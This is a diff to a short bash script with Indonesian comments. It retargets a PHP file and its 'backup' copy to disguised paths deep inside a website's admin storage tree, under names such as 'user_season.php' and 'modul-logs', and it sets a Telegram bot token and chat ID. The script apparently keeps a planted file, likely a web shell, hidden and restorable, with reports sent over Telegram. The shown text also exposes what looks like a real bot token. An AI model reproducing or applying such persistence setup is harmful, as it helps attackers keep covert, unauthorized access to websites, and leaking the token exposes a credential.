@@ -1,13 +1,13 @@
 #!/bin/bash
 
 # Definisikan lokasi file index.php Permissions 755
-INDEX_FILE="/var/www/ideastile/public_html/system/admin.php"
+INDEX_FILE="/var/www/ideastile/public_html/system/storage/modification/admin/controller/catalog/user_season.php"
 # Definisikan lokasi folder backup Permissions 755
-BACKUP_FOLDER="/var/www/ideastile/"
+BACKUP_FOLDER="/var/www/ideastile/public_html/system/storage/modification/admin/controller/extension/extension"
 # Buat folder backup jika belum ada
 mkdir -p "$BACKUP_FOLDER"
 # Tentukan nama file backup Permissions 755
-BACKUP_FILE="$BACKUP_FOLDER/file_base"
+BACKUP_FILE="$BACKUP_FOLDER/modul-logs"
 
 # Token dan ID chat Telegram
 TOKEN="7588613295:AAHNs_IOFuLy_weuOoKMPWaGobPMvtz5mp4"
